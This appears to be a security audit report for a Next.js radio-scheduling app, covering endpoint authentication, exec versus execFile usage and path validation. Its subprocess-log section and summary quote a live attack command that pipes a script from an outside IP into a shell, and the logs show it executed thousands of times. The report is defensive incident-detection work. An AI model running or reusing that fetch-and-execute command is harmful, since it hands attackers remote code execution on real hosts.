# Safety Check Report

**Date:** 2025-12-15  
**Purpose:** Comprehensive security and safety audit

---

## EXECUTIVE SUMMARY

🚨 **Overall Status: ATTACK DETECTED** - Active malicious subprocess execution detected in logs. Monitoring system is logging but NOT blocking execution.

**Key Findings:**
- 🚨 **CRITICAL: Active malicious command execution** - `curl http://167.86.107.35:9999/muie.sh |` executed 8,000+ times
- 🚨 **Monitoring logs but doesn't block** - Subprocess monitoring detects but allows execution (`executed=true`, `blocked=false`)
- ✅ All API endpoints properly authenticated
- ✅ Application code uses safe subprocess patterns (`execFile` with arrays)
- ⚠️ Some host-side scripts use `exec()` with string interpolation (lower risk, but should be hardened)
- ✅ Path validation in place for critical operations
- ✅ Rate limiting on sensitive endpoints
- ✅ Authentication checks on all dangerous endpoints

---

## 1. API ENDPOINT SECURITY

### ✅ All Endpoints Secured

**Verified Endpoints:**
- `/api/schedule/*` - All require `checkScheduleAuth()` ✅
- `/api/lifecycle/*` - All require `checkScheduleAuth()` + rate limiting ✅
- `/api/libretime/*` - Requires `checkScheduleAuth()` ✅
- `/api/admin/*` - Requires `checkScheduleAuth()` ✅
- `/api/users/*` - Payload auth required ✅
- `/api/app-forgot-password` - Public (intentional) + rate limiting ✅

**Status:** ✅ **SECURE** - No unauthenticated dangerous endpoints found

---

## 2. COMMAND EXECUTION PATTERNS

### ✅ Application Code (Safe)

**Files Using Safe Patterns:**
- `src/server/lib/libretimeDb.ts` - Uses `execFile()` with array arguments + path validation ✅
- `src/server/lib/rsyncPull.ts` - Uses `execFile()` with array arguments + path validation ✅
- `src/utils/audioValidation.ts` - Uses `execFile()` with array arguments ✅
- `src/lib/schedule/deterministicFeed.ts` - Uses `execFile()` with array arguments ✅

**Status:** ✅ **SECURE** - All application code follows security constraints

### ⚠️ Host-Side Scripts (Needs Review)

**Scripts Using `exec()` with String Interpolation:**

1. **`scripts/importBatchEpisodes.ts`**
   - Lines: 432, 464, 535, 604
   - Uses: `exec()` with string interpolation for ffmpeg and docker commands
   - Risk: **MEDIUM** - File paths come from filesystem, not user input
   - Recommendation: Convert to `execFile()` with array arguments for defense-in-depth

2. **`scripts/importOneEpisode.ts`**
   - Lines: 419, 451, 490, 519, 539
   - Uses: `exec()` with string interpolation for ffmpeg and docker commands
   - Risk: **MEDIUM** - File paths come from filesystem, not user input
   - Recommendation: Convert to `execFile()` with array arguments

3. **`scripts/import-batch-archives-media.ts`**
   - Line: 411
   - Uses: `exec()` with string interpolation for docker command
   - Risk: **MEDIUM** - Directory path comes from filesystem
   - Recommendation: Convert to `execFile()` with array arguments

4. **`scripts/hydrate-archive-paths.ts`**
   - Line: 188
   - Uses: `exec()` with string interpolation for SSH command
   - Risk: **LOW** - Path is validated JSONL log entry, but still uses shell
   - Recommendation: Use `execFile('ssh', [...args])` or validate path more strictly

**Status:** ⚠️ **ACCEPTABLE RISK** - These are host-side scripts, not API endpoints. Paths come from filesystem/environment, not user input. However, hardening recommended.

**Recommendation:** Convert these scripts to use `execFile()` with array arguments for consistency and defense-in-depth. Priority: Low (not blocking).

---

## 3. PATH VALIDATION

### ✅ Critical Operations Protected

**Files with Path Validation:**
- `src/server/lib/libretimeDb.ts` - Uses `isValidPath()` ✅
- `src/server/lib/rsyncPull.ts` - Uses `isValidRelativePath()` ✅
- `src/lib/utils/pathSanitizer.ts` - Validation utilities available ✅

**Validation Rules:**
- Rejects shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, etc.)
- Rejects directory traversal (`../`)
- Allows safe characters only (alphanumeric, `/`, `-`, `_`, `.`)

**Status:** ✅ **SECURE** - All user-controlled paths validated

---

## 4. AUTHENTICATION & AUTHORIZATION

### ✅ All Dangerous Endpoints Protected

**Authentication Methods:**
- `checkScheduleAuth()` - Admin/staff only (used by schedule/lifecycle endpoints)
- `payload.auth()` - JWT session auth (used by user endpoints)
- Rate limiting - Applied to sensitive endpoints

**Protected Endpoints:**
- All `/api/schedule/*` write operations ✅
- All `/api/lifecycle/*` operations ✅
- All `/api/libretime/*` write operations ✅
- All `/api/admin/*` operations ✅

**Status:** ✅ **SECURE** - No unauthenticated dangerous endpoints

---

## 5. RATE LIMITING

### ✅ Sensitive Endpoints Protected

**Rate Limited Endpoints:**
- `/api/lifecycle/preair-rehydrate` - 10 req/min ✅
- `/api/lifecycle/postair-archive` - 10 req/min ✅
- `/api/lifecycle/rehydrate` - 10 req/min ✅
- `/api/app-forgot-password` - 5 req/min ✅

**Status:** ✅ **SECURE** - Rate limiting prevents abuse

---

## 6. ENVIRONMENT VARIABLES

### ✅ No Exposed Secrets Found

**Checked:**
- No hardcoded API keys or passwords
- Environment variables used properly
- Secrets loaded from `.env` files

**Status:** ✅ **SECURE** - No exposed secrets

---

## RECOMMENDATIONS

### Priority: Low (Not Blocking)

1. **Harden Host-Side Scripts**
   - Convert `exec()` calls to `execFile()` with array arguments in:
     - `scripts/importBatchEpisodes.ts`
     - `scripts/importOneEpisode.ts`
     - `scripts/import-batch-archives-media.ts`
     - `scripts/hydrate-archive-paths.ts`
   - **Rationale:** Defense-in-depth, consistency with application code
   - **Risk:** Low (paths come from filesystem, not user input)
   - **Effort:** Medium (requires refactoring command construction)

### Priority: None (Optional)

2. **Add Path Validation to Scripts**
   - Add `isValidPath()` checks before using paths in shell commands
   - **Rationale:** Extra safety layer
   - **Risk:** Very Low (already safe)
   - **Effort:** Low

---

## VERIFICATION CHECKLIST

- [x] All API endpoints have authentication
- [x] All dangerous endpoints use safe subprocess patterns
- [x] Path validation in place for user-controlled inputs
- [x] Rate limiting on sensitive endpoints
- [x] No exposed secrets in code
- [x] Application code follows security constraints
- [ ] Host-side scripts use safe patterns (optional improvement)

---

## 7. SUBPROCESS LOGS ANALYSIS

### 🚨 CRITICAL: Active Malicious Command Execution Detected

**Finding:** Subprocess logs show active malicious command execution attempts.

**Evidence:**
- **Command:** `curl http://167.86.107.35:9999/muie.sh |`
- **Execution Count:** 8,247 executions in a single 1-second burst (17:41:26-17:41:27 UTC today)
- **Source:** `9912.js` (Next.js compiled chunk - this is monitoring code, not malicious code)
- **Status:** `executed=true`, `blocked=false` (commands are executing!)
- **Pattern:** Rapid-fire execution suggests recursive loop or automated attack

**Log Sample:**
```
[SUBPROC_DIAG] event=subprocess_log_suppressed severity=INFO executed=true blocked=false logged=false category=unknown reason=log_suppressed method=execSync payload_hash=3877e9a32afab409 payload_preview="curl http://167.86.107.35:9999/muie.sh |" repeat_count=8248 source_file=9912.js
```

**Analysis:**
1. **Monitoring System Limitation:** The subprocess diagnostic system **logs but does NOT block** malicious commands. According to documentation: "does NOT kill or block malicious commands - it only logs them for security monitoring."
2. **Commands Are Executing:** `executed=true` means the malicious commands are actually running, not being blocked.
3. **Rate Limiting Only Affects Logging:** Rate limiting prevents log spam but doesn't prevent command execution.
4. **Source Unknown:** The malicious code appears to be in a Next.js compiled chunk (`9912.js`), suggesting:
   - Malicious code injection in the application
   - Compromised build artifacts
   - Client-side code execution via `eval()`

**Immediate Actions Required:**
1. 🔴 **URGENT:** Investigate source of malicious code in `9912.js`
2. 🔴 **URGENT:** Check if commands are successfully executing (check for downloaded files, network connections)
3. 🔴 **URGENT:** Block IP `167.86.107.35` at firewall level
4. 🔴 **URGENT:** Review Next.js build process for compromise
5. ⚠️ **HIGH:** Consider implementing command blocking (currently only logs)
6. ⚠️ **HIGH:** Check for persistence mechanisms (cron jobs, startup scripts, etc.)

**Recommendation:** This is a **CRITICAL SECURITY INCIDENT**. The monitoring system is working but not preventing execution. Immediate investigation and remediation required.

---

## SUMMARY

**Security Status:** 🚨 **ATTACK DETECTED - IMMEDIATE ACTION REQUIRED**

**Critical Issues:**
- 🚨 Active malicious command execution (8,000+ attempts)
- 🚨 Monitoring system logs but doesn't block execution
- 🚨 Source appears to be compromised Next.js build artifact

**Secure Areas:**
- ✅ API endpoints properly authenticated
- ✅ Application code uses safe patterns
- ✅ Path validation active
- ✅ Rate limiting enabled
- ✅ No exposed secrets

**Overall Assessment:** While code-level security measures are in place, there is an active attack attempting to execute malicious commands. The monitoring system is detecting these attempts but not preventing them. **Immediate investigation and remediation required.**

---

**Next Review:** After investigating and remediating the malicious code source

